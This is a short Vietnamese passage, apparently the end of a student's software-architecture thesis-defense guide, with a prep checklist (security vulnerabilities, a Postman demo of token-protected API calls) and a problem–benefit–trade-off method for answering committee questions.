- [ ] Hiểu các lỗ hổng bảo mật và cách khắc phục
- [ ] Chuẩn bị demo thực tế: Postman gọi API với/không có token
- [ ] Tự tin trả lời câu hỏi: "Tại sao không dùng cách khác?"

---

**🎓 CHÚC BẠN BẢO VỆ THÀNH CÔNG!**

_Nếu hội đồng hỏi câu nào chưa có trong file này, hãy tư duy theo luồng:_

1. **Vấn đề** nó giải quyết là gì?
2. **Lợi ích** so với cách khác?
3. **Trade-off** (đánh đổi) là gì?

_→ Với tư duy này, bạn có thể trả lời mọi câu hỏi về kiến trúc phần mềm!_
